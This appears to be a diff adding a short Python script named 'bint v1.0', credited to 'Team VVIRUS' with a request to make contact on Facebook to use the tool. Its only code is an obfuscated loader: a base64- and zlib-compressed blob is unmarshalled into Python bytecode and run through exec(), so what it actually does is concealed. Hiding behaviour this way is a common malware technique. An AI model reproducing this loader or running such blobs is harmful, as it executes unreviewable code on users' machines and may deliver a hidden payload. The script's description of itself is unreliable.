@@ -1,0 +1,8 @@
+# bint v1.0
+# Contact Me On Facebook For Using This Tool
+# Coded By BotolMehedi
+# If You Wanna Take Credits For This Code, Please Look Yourself Again...
+# Reserved2020
+# Powered by Team VVIRUS
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJxFU8GOVTcMve8xUNqvYMFilrbjOLGEELaTSN10g9jMbmCeVNCMqOY9Nmz5N36L+kqFRonle50c28f2h+2/9STPmzxnT3GX+7Ddb9vNL/2w3Rx+6sft5ridDtunJ9vpuH262u6O27fDvtN69S7F2+sd7+OPXH9dvh+3rXWNXiuGywwqgOCxCtbqDQk4TcraJ3SoXOuspIRaURgNxKJGZS2ioBRpl6C+og0cBDYMocEUjxFhMxo5L6wrStfi4IWHeaVeccYiBifugVhnKdidANqIWVqByUUj4TVsBFSPBlQippY0Q++EjWENmFWJmpQakgjkTZEDi48VhB5eCATnSOjFjUZVnCS9lcLUZY4ZhZiRBEFnd2yD+0gsQGKUFnVSRGEeUlPWjkv30IQUJZ2BrsUiFXhNwBLCyVWgWJmaj6XrKLR0sierSnMIhWlenZB5cER09lIhc68Crt4s0EcdsFQLz2BNPphwjL0YnW1WK5CBdIrVyCRzFmpe9zdcl5eYFtHWSPa8Z/itzjmtcLeV2enIO575LLeZMI1mQ8ywKhopcOnN2VoF9aQ2gaatGC16hyWitVhyJarostDbWKbGxazTXJ2MLL13y3IhyEATMsgOy7BbEuVCQNNGEubZbQYZVzrYsTizLGFRZPRsJzB3bSC1FTcnU3IRX3VZlnEsHGv59dPs6stvKR5uH89/395frlL/ev/x/eVZKu9vzyfhyx/7BJ0+fH745/F0Pl9+3y0o+5+70/U+a/+L8258+yXRHl/8OS7P8+vVw+e7L/en17uXc07O9vLwL7x9ydw="))))
